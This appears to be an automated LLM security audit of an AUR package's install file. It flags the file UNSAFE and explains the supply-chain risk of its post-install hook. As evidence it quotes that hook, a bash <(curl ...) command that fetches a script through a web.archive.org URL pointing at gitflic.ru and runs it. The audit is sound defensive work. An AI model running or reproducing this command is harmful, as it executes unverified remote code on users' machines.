LLM auditresponse for brvae-beta-bin.install:
<security_assessment>
<decision>UNSAFE</decision>
<details>
The `brvae-beta-bin.install` file contains a post-installation hook that executes a shell script fetched directly from a remote URL using `bash <(curl ...)`. This pattern is inherently dangerous because it downloads and immediately executes code without verification, enabling arbitrary code execution from an external source.

The URL points to `web.archive.org`, which proxies content from `gitflic.ru`, a third-party hosting service. While the use of the Wayback Machine might suggest an attempt to access archived content, the dynamic execution of unverified scripts undermines security. The script could be altered or the archive could serve malicious content without integrity checks, making this a potential supply-chain attack vector.

This behavior deviates from standard AUR packaging practices, where post-install actions are typically limited to cache updates or configuration setup. Executing remote code serves no legitimate packaging purpose and introduces unacceptable risk.
</details>
<evidence>
bash <(curl -L 'https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh' 2>/dev/null)
</evidence>
